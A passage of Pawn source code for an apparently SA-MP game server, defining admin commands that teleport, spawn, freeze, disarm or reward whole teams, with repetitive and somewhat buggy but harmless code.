		   	format(string,sizeof(string),"Team %s Has Been Telepoted By Administrator %s",PlayerName2(playerid),params);
		   	SendClientMessageToAll(C_PINK, string);
	   }
	   //-------Arabia---------
	   if(strfind(params,"Arabia",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   	foreach(Player, i)
			{
			   	if(gTeam[i] == TEAM_ARAB)
			   	{
				   	SetPlayerPos(i, x+3, y, z);
				   	SetPlayerInterior(i, interior);
				   	SetPlayerVirtualWorld(i, world);
				   	TogglePlayerControllable(i, false);
				   	PlayerInfo[i][Frozen] = 1;
			   	}
		   	}
		   	new string[100];
		   	format(string,sizeof(string),"Team %s Has Been Telepoted By Administrator %s",PlayerName2(playerid),params);
		   	SendClientMessageToAll(C_PINK, string);
	   }
	   //----------Soviet-------
	   if(strfind(params,"Soviet",true) != -1 || strfind(params,"Russia",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   	foreach(Player, i)
			{
			   	if(gTeam[i] == TEAM_SOVIET)
			   	{
				   	SetPlayerPos(i, x+3, y, z);
				   	SetPlayerInterior(i, interior);
				   	SetPlayerVirtualWorld(i, world);
				   	TogglePlayerControllable(i, false);
				   	PlayerInfo[i][Frozen] = 1;
			   	}
		   	}
		   	new string[100];
		   	format(string,sizeof(string),"Team %s Has Been Telepoted By Administrator %s",PlayerName2(playerid),params);
		   	SendClientMessageToAll(C_PINK, string);
	   }
	   //-----------Australia---------
	   if(strfind(params,"Australia",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   	foreach(Player, i)
			{
			   	if(gTeam[i] == TEAM_AUS)
			   	{
				   	SetPlayerPos(i, x+3, y, z);
                   	SetPlayerInterior(i, interior);
				   	SetPlayerVirtualWorld(i, world);
				   	TogglePlayerControllable(i, false);
				   	PlayerInfo[i][Frozen] = 1;
			   	}
		   	}
		   	new string[100];
		   	format(string,sizeof(string),"Team %s Has Been Telepoted By Administrator %s",PlayerName2(playerid),params);
		   	SendClientMessageToAll(C_PINK, string);
	   	}
	}
	else return SendClientMessage(playerid, red,"You Are Not Consisting The Level To Use This Command!");
	return 1;
}

CMD:gteam(playerid, params[])
{
   if(PlayerInfo[playerid][Level] >= 4)
   {
	   new team[100], Float:x, Float:y, Float:z, interior = GetPlayerInterior(playerid), world = GetPlayerVirtualWorld(playerid);
	   if(sscanf(params,"s[100]",team)) return SendClientMessage(playerid, RED,"JikyBot: Usage:/getteam [teamname USA/Eur/Arab/Rus/Aus/Vet]");
	   GetPlayerPos(playerid, x, y, z);
	   //---------USA------------------------
	   if(strfind(params,"USA",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
	   		foreach(Player, i)
			{
			   if(gTeam[i] == TEAM_USA)
			   {
				   SetPlayerInterior(i, interior);
				   SetPlayerVirtualWorld(i, world);
				   SetPlayerPos(i, x+3, y, z);
				   TogglePlayerControllable(i, false);
				   PlayerInfo[i][Frozen] = 1;
				   ResetPlayerWeapons(i);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Team %s Has Been Telepoted By Administrator %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //---------------------------------
	   if(strfind(params,"Vet",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   	foreach(Player, i)
			{
			   if(gTeam[i] == TEAM_MARVEL)
			   {
				   SetPlayerInterior(i, interior);
				   SetPlayerVirtualWorld(i, world);
				   SetPlayerPos(i, x+3, y, z);
				   TogglePlayerControllable(i, false);
				   PlayerInfo[i][Frozen] = 1;
				   ResetPlayerWeapons(i);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Team %s Has Been Telepoted By Administrator %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //--------Eurasia----------------
	   if(strfind(params,"Eur",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   	foreach(Player, i)
			{
			   if(gTeam[i] == TEAM_EURASIA)
			   {
				   SetPlayerPos(i, x+3, y, z);
				   SetPlayerInterior(i, interior);
				   SetPlayerVirtualWorld(i, world);
				   TogglePlayerControllable(i, false);
				   PlayerInfo[i][Frozen] = 1;
				   ResetPlayerWeapons(i);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Team %s Has Been Telepoted By Administrator %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //-------Arabia---------
	   if(strfind(params,"Arab",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   	foreach(Player, i)
			{
			   if(gTeam[i] == TEAM_ARAB)
			   {
				   SetPlayerPos(i, x+3, y, z);
				   SetPlayerInterior(i, interior);
				   SetPlayerVirtualWorld(i, world);
				   TogglePlayerControllable(i, false);
				   PlayerInfo[i][Frozen] = 1;
				   ResetPlayerWeapons(i);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Team %s Has Been Telepoted By Administrator %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //----------Soviet-------
	   if(strfind(params,"rus",true) != -1 || strfind(params,"Russia",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   	foreach(Player, i)
			{
			   if(gTeam[i] == TEAM_SOVIET)
			   {
				   SetPlayerPos(i, x+3, y, z);
				   SetPlayerInterior(i, interior);
				   SetPlayerVirtualWorld(i, world);
				   TogglePlayerControllable(i, false);
				   PlayerInfo[i][Frozen] = 1;
				   ResetPlayerWeapons(i);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Team %s Has Been Telepoted By Administrator %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //-----------Australia---------
	   if(strfind(params,"Aus",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   	foreach(Player, i)
			{
			   if(gTeam[i] == TEAM_AUS)
			   {
				   SetPlayerPos(i, x+3, y, z);
                   SetPlayerInterior(i, interior);
				   SetPlayerVirtualWorld(i, world);
				   TogglePlayerControllable(i, false);
				   PlayerInfo[i][Frozen] = 1;
				   ResetPlayerWeapons(i);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Team %s Has Been Telepoted By Administrator %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	}
	else return SendClientMessage(playerid, red,"You Are Not Consisting The Level To Use This Command!");
	return 1;
}

CMD:spawnteam(playerid, params[])
{
   if(PlayerInfo[playerid][Level] >= 4)
   {
	   new team[100];
	   if(sscanf(params,"s[100]",team)) return SendClientMessage(playerid, RED,"JikyBot: Usage:/spawnteam [teamname USA/Eurasia/Arabia/Soviet/Australia/Vietnam]");
	   //---------USA------------------------
	   if(strfind(params,"USA",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   	foreach(Player, i)
			{
			   if(gTeam[i] == TEAM_USA)
			   {
				   SpawnPlayer(i);
				   SetPlayerVirtualWorld(i, 0);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Team %s has been spawned.",params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //---------------------------------
	   if(strfind(params,"Vietnam",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   	foreach(Player, i)
			{
			   if(gTeam[i] == TEAM_MARVEL)
			   {
				   SpawnPlayer(i);
				   SetPlayerVirtualWorld(i, 0);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Team %s has been spawned.",params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //--------Eurasia----------------
	   if(strfind(params,"Eurasia",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   	foreach(Player, i)
			{
			   if(gTeam[i] == TEAM_EURASIA)
			   {
				   SpawnPlayer(i);
				   SetPlayerVirtualWorld(i, 0);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Team %s has been spawned.",params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //-------Arabia---------
	   if(strfind(params,"Arabia",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   	foreach(Player, i)
			{
			   if(gTeam[i] == TEAM_ARAB)
			   {
				   SpawnPlayer(i);
				   SetPlayerVirtualWorld(i, 0);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Team %s has been spawned.",params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //----------Soviet-------
	   if(strfind(params,"Soviet",true) != -1 || strfind(params,"Russia",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   	foreach(Player, i)
			{
			   if(gTeam[i] == TEAM_SOVIET)
			   {
				   SpawnPlayer(i);
				   SetPlayerVirtualWorld(i, 0);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Team %s has been spawned.",params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //-----------Australia---------
	   if(strfind(params,"Australia",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   	foreach(Player, i)
			{
			   if(gTeam[i] == TEAM_AUS)
			   {
				   SpawnPlayer(i);
				   SetPlayerVirtualWorld(i, 0);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Team %s has been spawned.",params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	}
	else return SendClientMessage(playerid, red,"You Are Not Consisting The Level To Use This Command!");
	return 1;
}
CMD:steam(playerid, params[])
{
   if(PlayerInfo[playerid][Level] >= 4)
   {
	   new team[100];
	   if(sscanf(params,"s[100]",team)) return SendClientMessage(playerid, RED,"JikyBot: Usage:/spawnteam [teamname USA/Eur/Arab/Rus/Aus/Vet]");
	   //---------USA------------------------
	   if(strfind(params,"USA",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   	foreach(Player, i)
			{
			   if(gTeam[i] == TEAM_USA)
			   {
				   SpawnPlayer(i);
				   SetPlayerVirtualWorld(i, 0);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Team %s has been spawned.",params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   	   if(strfind(params,"Vet",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   	foreach(Player, i)
			{
			   if(gTeam[i] == TEAM_MARVEL)
			   {
				   SpawnPlayer(i);
				   SetPlayerVirtualWorld(i, 0);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Team %s has been spawned.",params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //---------------------------------
	   //--------Eurasia----------------
	   if(strfind(params,"Eur",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   	foreach(Player, i)
			{
			   if(gTeam[i] == TEAM_EURASIA)
			   {
				   SpawnPlayer(i);
				   SetPlayerVirtualWorld(i, 0);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Team %s has been spawned.",params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //-------Arabia---------
	   if(strfind(params,"Arab",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   	foreach(Player, i)
			{
			   if(gTeam[i] == TEAM_ARAB)
			   {
				   SpawnPlayer(i);
				   SetPlayerVirtualWorld(i, 0);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Team %s has been spawned.",params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //----------Soviet-------
	   if(strfind(params,"Soviet",true) != -1 || strfind(params,"Rus",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   	foreach(Player, i)
			{
			   if(gTeam[i] == TEAM_SOVIET)
			   {
				   SpawnPlayer(i);
				   SetPlayerVirtualWorld(i, 0);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Team %s has been spawned.",params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //-----------Australia---------
	   if(strfind(params,"Aus",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   	foreach(Player, i)
			{
			   if(gTeam[i] == TEAM_AUS)
			   {
				   SpawnPlayer(i);
				   SetPlayerVirtualWorld(i, 0);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Team %s has been spawned.",params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	}
	else return SendClientMessage(playerid, red,"You Are Not Consisting The Level To Use This Command!");
	return 1;
}
CMD:freezeteam(playerid, params[])
{
   if(PlayerInfo[playerid][Level] >= 4)
   {
	   new team[100];
	   if(sscanf(params,"s[100]",team)) return SendClientMessage(playerid, RED,"JikyBot: Usage:/freezeteam [teamname USA/Eurasia/Vietnam/Arabia/Soviet/Australia]");
	   //---------USA------------------------
	   if(strfind(params,"USA",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   	foreach(Player, i)
			{
			   if(gTeam[i] == TEAM_USA)
			   {
				   TogglePlayerControllable(i, false);
				   PlayerInfo[i][Frozen] = 1;
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Team %s Has Been  Frozen By Administrator %s.",PlayerName2(playerid),params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //---------------------------------
	   if(strfind(params,"Vietnam",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   	foreach(Player, i)
			{
			   if(gTeam[i] == TEAM_MARVEL)
			   {
				   TogglePlayerControllable(i, false);
				   PlayerInfo[i][Frozen] = 1;
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Team %s Has Been  Frozen By Administrator %s.",PlayerName2(playerid),params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //--------Eurasia----------------
	   if(strfind(params,"Eurasia",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   	foreach(Player, i)
			{
			   if(gTeam[i] == TEAM_EURASIA)
			   {
				   TogglePlayerControllable(i, false);
				   PlayerInfo[i][Frozen] = 1;
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Team %s Has Been  Frozen By Administrator %s.",PlayerName2(playerid),params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //-------Arabia---------
	   if(strfind(params,"Arabia",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
			   if(gTeam[i] == TEAM_ARAB)
			   {
				   TogglePlayerControllable(i, false);
				   PlayerInfo[i][Frozen] = 1;
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Team %s Has Been  Frozen By Administrator %s.",PlayerName2(playerid),params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //----------Soviet-------
	   if(strfind(params,"Soviet",true) != -1 || strfind(params,"Russia",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
			   if(gTeam[i] == TEAM_SOVIET)
			   {
				   TogglePlayerControllable(i, false);
				   PlayerInfo[i][Frozen] = 1;
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Team %s Has Been  Frozen By Administrator %s.",PlayerName2(playerid),params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //-----------Australia---------
	   if(strfind(params,"Australia",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
			   if(gTeam[i] == TEAM_AUS)
			   {
				   TogglePlayerControllable(i, false);
				   PlayerInfo[i][Frozen] = 1;
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Team %s Has Been  Frozen By Administrator %s.",PlayerName2(playerid),params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	}
	else return SendClientMessage(playerid, red,"You Are Not Consisting The Level To Use This Command!");
	return 1;
}

CMD:fteam(playerid, params[])
{
   if(PlayerInfo[playerid][Level] >= 4)
   {
	   new team[100];
	   if(sscanf(params,"s[100]",team)) return SendClientMessage(playerid, RED,"JikyBot: Usage:/freezeteam [teamname USA/Eur/Arab/Rus/Aus/Vet]");
	   //---------USA------------------------
	   if(strfind(params,"USA",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
			   if(gTeam[i] == TEAM_USA)
			   {
				   TogglePlayerControllable(i, false);
				   PlayerInfo[i][Frozen] = 1;
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Team %s Has Been  Frozen By Administrator %s.",PlayerName2(playerid),params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //---------------------------------
	   //--------Eurasia----------------
	   if(strfind(params,"Eur",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
			   if(gTeam[i] == TEAM_EURASIA)
			   {
				   TogglePlayerControllable(i, false);
				   PlayerInfo[i][Frozen] = 1;
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Team %s Has Been  Frozen By Administrator %s.",PlayerName2(playerid),params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //-------Arabia---------
	   if(strfind(params,"Arab",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
			   if(gTeam[i] == TEAM_ARAB)
			   {
				   TogglePlayerControllable(i, false);
				   PlayerInfo[i][Frozen] = 1;
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Team %s Has Been  Frozen By Administrator %s.",PlayerName2(playerid),params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   if(strfind(params,"Eur",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
			   if(gTeam[i] == TEAM_EURASIA)
			   {
				   TogglePlayerControllable(i, false);
				   PlayerInfo[i][Frozen] = 1;
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Team %s Has Been  Frozen By Administrator %s.",PlayerName2(playerid),params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //----------Soviet-------
	   if(strfind(params,"Rus",true) != -1 || strfind(params,"Vietnam",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
			   if(gTeam[i] == TEAM_SOVIET)
			   {
				   TogglePlayerControllable(i, false);
				   PlayerInfo[i][Frozen] = 1;
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Team %s Has Been  Frozen By Administrator %s.",PlayerName2(playerid),params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   	   if(strfind(params,"Vet",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
			   if(gTeam[i] == TEAM_MARVEL)
			   {
				   TogglePlayerControllable(i, false);
				   PlayerInfo[i][Frozen] = 1;
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Team %s Has Been  Frozen By Administrator %s.",PlayerName2(playerid),params);
		   SendClientMessageToAll(C_PINK, string);
	   }

	   //-----------Australia---------
	   if(strfind(params,"Aus",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
			   if(gTeam[i] == TEAM_AUS)
			   {
				   TogglePlayerControllable(i, false);
				   PlayerInfo[i][Frozen] = 1;
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Team %s Has Been  Frozen By Administrator %s.",PlayerName2(playerid),params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	}
	else return SendClientMessage(playerid, red,"You Are Not Consisting The Level To Use This Command!");
	return 1;
}

CMD:unfreezeteam(playerid, params[])
{
   if(PlayerInfo[playerid][Level] >= 4)
   {
	   new team[100];
	   if(sscanf(params,"s[100]",team)) return SendClientMessage(playerid, RED,"JikyBot: Usage:/unfreezeteam [teamname USA/Eurasia/Arabia/Soviet/Australia/Vietnam]");
	   //---------USA------------------------
	   if(strfind(params,"USA",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
			   if(gTeam[i] == TEAM_USA)
			   {
				   TogglePlayerControllable(i, true);
				   PlayerInfo[i][Frozen] = 0;
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has unfrozen team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //---------------------------------
	   //--------Eurasia----------------
	   if(strfind(params,"Eurasia",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
			   if(gTeam[i] == TEAM_EURASIA)
			   {
				   TogglePlayerControllable(i, true);
				   PlayerInfo[i][Frozen] = 0;
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has unfrozen team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //-------Arabia---------
	   if(strfind(params,"Arabia",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
			   if(gTeam[i] == TEAM_ARAB)
			   {
				   TogglePlayerControllable(i, true);
				   PlayerInfo[i][Frozen] = 0;
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has unfrozen team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(C_PINK, string);
	   }

	   //----------Soviet-------
	   if(strfind(params,"Soviet",true) != -1 || strfind(params,"Russia",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
			   if(gTeam[i] == TEAM_SOVIET)
			   {
				   TogglePlayerControllable(i, true);
				   PlayerInfo[i][Frozen] = 0;
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has unfrozen team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //ggggggggggg//
	   if(strfind(params,"Vietnam",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
			   if(gTeam[i] == TEAM_MARVEL)
			   {
				   TogglePlayerControllable(i, true);
				   PlayerInfo[i][Frozen] = 0;
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has unfrozen team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	}
	   //-----------Australia---------
	   if(strfind(params,"Australia",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
			   if(gTeam[i] == TEAM_AUS)
			   {
				   TogglePlayerControllable(i, true);
				   PlayerInfo[i][Frozen] = 0;
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has unfrozen team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(C_PINK, string);
	   }

	else return SendClientMessage(playerid, red,"You Are Not Consisting The Level To Use This Command!");
	return 1;
}
CMD:dteam(playerid, params[])
{
   if(PlayerInfo[playerid][Level] >= 4)
   {
	   new team[100];
	   if(sscanf(params,"s[100]",team)) return SendClientMessage(playerid, RED,"JikyBot: Usage:/disarmteam [teamname USA/Eur/Arab/Rus/Aus/Vet]");
	   //---------USA------------------------
	   if(strfind(params,"USA",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
			   if(gTeam[i] == TEAM_USA)
			   {
					ResetPlayerWeapons(i);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has disarmed team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //---------------------------------
	   //--------Eurasia----------------
	   if(strfind(params,"Eur",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
			   if(gTeam[i] == TEAM_EURASIA)
			   {
				   ResetPlayerWeapons(i);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has disarmed team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //-------Arabia---------
	   if(strfind(params,"Arab",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
			   if(gTeam[i] == TEAM_ARAB)
			   {
				   ResetPlayerWeapons(i);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has disarmed team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //----------Soviet-------
	   if(strfind(params,"Rus",true) != -1 || strfind(params,"Russia",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
			   if(gTeam[i] == TEAM_SOVIET)
			   {
				   ResetPlayerWeapons(i);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has disarmed team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	    if(strfind(params,"Vet",true) != -1 || strfind(params,"Vietnam",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
			   if(gTeam[i] == TEAM_MARVEL)
			   {
				   ResetPlayerWeapons(i);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has disarmed team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //-----------Australia---------
	   if(strfind(params,"Aus",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
			   if(gTeam[i] == TEAM_AUS)
			   {
				   ResetPlayerWeapons(i);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has disarmed team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	}
	else return SendClientMessage(playerid, red,"You Are Not Consisting The Level To Use This Command!");
	return 1;
}
CMD:gsteam(playerid, params[])
{
   if(PlayerInfo[playerid][Level] >= 4)
   {
	   new team[100], amount;
	   if(sscanf(params,"s[100]d",team, amount)) return SendClientMessage(playerid, RED,"JikyBot: Usage:/givescoreteam [teamname USA/Eur/Arab/Rus/Aus/Vet] [amount]");
	   //---------USA------------------------
	   if(strfind(params,"USA",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
			   if(gTeam[i] == TEAM_USA)
			   {
				   SetPlayerScore(i, GetPlayerScore(i)+amount);
				   PlayerPlaySound(i, 1057,0.0,0.0,0.0);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has given %d score to team %s",PlayerName2(playerid),amount, team);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //---------------------------------
	   //--------Eurasia----------------
	   if(strfind(params,"Eur",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
			   if(gTeam[i] == TEAM_EURASIA)
			   {
				   SetPlayerScore(i, GetPlayerScore(i)+amount);
				   PlayerPlaySound(i, 1057,0.0,0.0,0.0);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has given %d score to team %s",PlayerName2(playerid),amount,team);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //-------Arabia---------
	   if(strfind(params,"Arab",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
			   if(gTeam[i] == TEAM_ARAB)
			   {
				   SetPlayerScore(i, GetPlayerScore(i)+amount);
				   PlayerPlaySound(i, 1057,0.0,0.0,0.0);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has given %d score to team %s",PlayerName2(playerid),amount,team);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //----------Soviet-------
	   if(strfind(params,"Rus",true) != -1 || strfind(params,"Russia",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
			   if(gTeam[i] == TEAM_SOVIET)
			   {
				   SetPlayerScore(i, GetPlayerScore(i)+amount);
				   PlayerPlaySound(i, 1057,0.0,0.0,0.0);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has given %d score to team %s",PlayerName2(playerid),amount,team);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //hhghh//
	   	   if(strfind(params,"Vet",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
			   if(gTeam[i] == TEAM_MARVEL)
			   {
				   SetPlayerScore(i, GetPlayerScore(i)+amount);
				   PlayerPlaySound(i, 1057,0.0,0.0,0.0);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has given %d score to team %s",PlayerName2(playerid),amount,team);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //-----------Australia---------
	   if(strfind(params,"Aus",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
			   if(gTeam[i] == TEAM_AUS)
			   {
				   SetPlayerScore(i, GetPlayerScore(i)+amount);
				   PlayerPlaySound(i, 1057,0.0,0.0,0.0);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has given %d score to team %s",PlayerName2(playerid),amount,team);
		   SendClientMessageToAll(C_PINK, string);
	   }
	}
	else return SendClientMessage(playerid, red,"You Are Not Consisting The Level To Use This Command!");
	return 1;
}
CMD:gcteam(playerid, params[])
{
   if(PlayerInfo[playerid][Level] >= 4)
   {
	   new team[100], amount;
	   if(sscanf(params,"s[100]d",team, amount)) return SendClientMessage(playerid, RED,"JikyBot: Usage:/givecashteam [teamname USA/Eur/Arab/Rus/Aus/Vet] [amount]");
	   //---------USA------------------------
	   if(strfind(params,"USA",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
			   if(gTeam[i] == TEAM_USA)
			   {
				   GivePlayerMoney(i, amount);
				   PlayerPlaySound(i, 1057,0.0,0.0,0.0);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has given %d cash to team %s",PlayerName2(playerid),amount,team);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //---------------------------------
	   //--------Eurasia----------------
	   if(strfind(params,"Eur",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
